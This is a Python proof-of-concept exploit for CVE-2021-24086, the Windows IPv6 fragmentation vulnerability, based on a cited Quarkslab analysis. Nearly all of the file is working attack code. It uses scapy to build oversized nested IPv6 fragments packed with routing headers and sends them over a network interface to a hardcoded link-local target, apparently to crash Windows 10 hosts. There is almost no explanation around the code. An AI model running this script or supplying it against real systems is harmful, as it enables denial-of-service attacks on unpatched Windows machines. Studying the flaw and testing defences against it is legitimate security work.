'''
OS Name	Microsoft Windows 10 Education
Version	10.0.19044 Build 19044

CVE-2021-24086

Based on https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html
'''

from scapy.all import *
import random

FRAGMENT_SIZE = 0x400
LAYER4_FRAG_OFFSET = 0x8
NEXT_HEADER_IPV6_ROUTE = 43
NEXT_HEADER_IPV6_FRAG = 44
NEXT_HEADER_IPV6_ICMP = 58

def inner_fragment(target, interface):
    inner_fragment_id = random.randint(0, 0xffffffff)

    # Echo Request
    er = ICMPv6EchoRequest(data="BooM")
    er.cksum = 0xa472
    er = raw(er)

    # Overflow
    routes = raw(IPv6ExtHdrRouting(addresses=[], nh=NEXT_HEADER_IPV6_ROUTE)) * (0xffd0//8-1)
    routes += raw(IPv6ExtHdrRouting(addresses=[], nh=NEXT_HEADER_IPV6_FRAG))

    # First Inner Fragment
    FH = IPv6ExtHdrFragment(offset=0, m=1, id=inner_fragment_id, nh=NEXT_HEADER_IPV6_ICMP)

    return routes + raw(FH) + er[:LAYER4_FRAG_OFFSET], inner_fragment_id


def exploit(source, target, interface):
    print(f"[+] Source IPv6: {source}")
    print(f"[+] Target IPv6: {target}")
    print(f"[+] Interface: {interface}")

    inner_packet, inner_fragment_id = inner_fragment(target, interface)
    print(f"\n[+] Inner Fragment ID: {inner_fragment_id}")

    # IPv6 Header
    ip = IPv6(src=source, dst=target)
    hopbyhop = IPv6ExtHdrHopByHop(nh=NEXT_HEADER_IPV6_FRAG)

    outer_fragment_id = random.randint(0, 0xffffffff)

    # Fragmentable Part
    fragmentable_part = []
    for i in range(len(inner_packet) // FRAGMENT_SIZE):
        fragmentable_part.append(inner_packet[i * FRAGMENT_SIZE: (i+1) * FRAGMENT_SIZE])

    if len(inner_packet) % FRAGMENT_SIZE:
        fragmentable_part.append(inner_packet[(len(fragmentable_part)) * FRAGMENT_SIZE:])

    print(f"\n[*] Preparing fragments...")

    # Fragments
    frag_offset = 0
    frags_to_send = []
    for i in range(len(fragmentable_part)):
        if i == len(fragmentable_part) - 1:
            more = 0
        else:
            more = 1

        FH = IPv6ExtHdrFragment(offset=frag_offset//8, m=more, id=outer_fragment_id, nh=NEXT_HEADER_IPV6_ROUTE)
        blob = raw(FH/fragmentable_part[i])
        frag_offset += FRAGMENT_SIZE

        # Creating Ethernet Layer for each fragment
        eth = Ether(src="02:00:00:00:00:01", dst="02:00:00:00:00:02", type=0x86DD)  # Set Ethernet type to IPv6
        frags_to_send.append(eth/ip/hopbyhop/blob)


    print(f"[*] Sending {len(frags_to_send)} fragments...")
    for frag in frags_to_send:
        sendp(frag, iface=interface)

    print(f"[+] Sending last fragment...")
    raw_er = ICMPv6EchoRequest(data="PoC")
    raw_er.cksum = 0xa472
    raw_er = raw(raw_er)

    ip = IPv6(src=source, dst=target)
    FH = IPv6ExtHdrFragment(offset=LAYER4_FRAG_OFFSET // 8, m=0, id=inner_fragment_id, nh=NEXT_HEADER_IPV6_ICMP)
    eth = Ether(type=0x86DD)

    sendp(eth/ip/FH/raw_er[LAYER4_FRAG_OFFSET:], iface=interface)

if __name__ == '__main__':
    source = 'fe80::20c:29ff:fe04:b490'
    target = 'fe80::243e:653e:494d:c618'
    interface = 'ens33'
    exploit(source, target, interface)